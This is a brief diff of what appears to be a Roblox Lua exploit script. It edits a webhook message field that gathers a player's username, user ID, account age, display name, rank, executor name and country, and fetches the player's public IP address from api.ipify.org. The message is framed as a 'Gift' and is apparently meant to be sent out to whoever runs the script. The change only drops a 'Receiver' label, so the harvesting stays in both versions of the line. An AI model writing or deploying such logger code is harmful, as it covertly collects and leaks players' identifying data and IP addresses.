@@ -77,7 +77,7 @@ local data1 = {
 
                     ["name"] = "Ay Bi chilling u got a Gift From"..username.."",
 
-                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."\n:alien:Receiver:**", -- AAstraxXTopG
+                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- AAstraxXTopG
 
                     ["inline"] = false
 
